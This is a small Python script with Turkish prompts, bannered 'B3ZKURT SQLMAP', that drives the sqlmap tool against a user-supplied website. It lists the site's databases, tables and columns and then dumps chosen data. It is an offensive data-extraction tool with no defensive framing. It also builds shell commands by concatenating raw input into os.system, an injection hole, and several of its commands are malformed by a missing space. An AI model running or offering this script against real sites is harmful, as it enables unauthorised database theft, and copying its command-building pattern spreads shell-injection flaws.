import time
import os

os.system("clear")
print("#####################################")
print("                                     ")
print("                                     ")
print("                                     ")
print("             HOŞGELDİN!              ")
print("                                     ")
print("                                     ")
print("                                     ")
print("#####################################")

time.sleep(1)
os.system("clear")
print("#####################################")
print("                                     ")
print("                                     ")
print("                                     ")
print("           B3ZKURT SQLMAP            ")
print("                                     ")
print("                                     ")
print("                                     ")
print("#####################################")

print("")
site = input("Sitenizi Giriniz: ")
print("")

os.system("sqlmap -u " + site + " --dbs --batch ")

print("")
database = input("Database Giriniz: ")
print("")

os.system("sqlmap -u " + site + "-D " + database  + " --tables --batch")

print("")
tables = input("Tablo Giriniz: ")
print("")

os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " --columns --batch")

print("")
kolon = input("Kolon Giriniz: ")
print("")

os.system("sqlmap -u " + site + "-D " + database + " -T " + tables + " -C " + kolon + " --dump --batch")